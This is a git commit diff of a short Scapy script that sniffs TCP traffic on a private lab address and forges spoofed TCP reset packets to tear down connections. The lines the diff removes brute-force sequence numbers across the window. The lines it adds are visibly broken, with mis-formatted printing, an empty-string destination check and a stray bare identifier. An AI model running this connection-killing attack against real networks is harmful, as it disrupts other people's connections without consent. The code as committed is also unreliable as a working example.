95e7476d1e479f95fa70eece31803fb7222f959a
Samuel Wehunt <sam.wehunt@gmail.com>
2017-10-14 21:47:23 -0500

    added reset function

--- rst.py
+++ rst.py
@@ -1,10 +1,12 @@
 from scapy.all import *
+import random
 
 target_ip = "192.168.13.30"
 
 def pkt_callback(packet):
     if (TCP in packet):
-        if (packet[IP].dst == target_ip):
+        print("seq: %d, ack: %d\n" % packet[TCP].seq, packet[TCP].ack)
+        if (packet[IP].dst == ""):
             resetPkt = packet
             #set reset packet
             resetPkt[TCP].flags = 'R'
@@ -12,19 +14,13 @@ def pkt_callback(packet):
             ack = resetPkt[TCP].ack
             dst = resetPkt[IP].dst
             src = resetPkt[IP].src
-            resetPkt[TCP].ack = resetPkt[TCP].seq
+            resetPkt[TCP].seq = resetPkt[TCP].ack
+            reset
             resetPkt[IP].src = dst
             resetPkt[IP].dst = src
-            window = resetPkt[TCP].window
-            num_packs = (2**32)/window
-            print("sending %d packets" % num_packs)
-            #now enumerate through possible sequence numbers to try and kill the connection
-            for i in range(int(num_packs)):
-                seq = i*window
-                resetPkt[TCP].seq = seq
-                sendp(resetPkt)
 
 
+random.seed()
 interface = "ens10"
 conf.verb = 0
 sniff(iface=interface, prn=pkt_callback, filter="tcp", store=0)
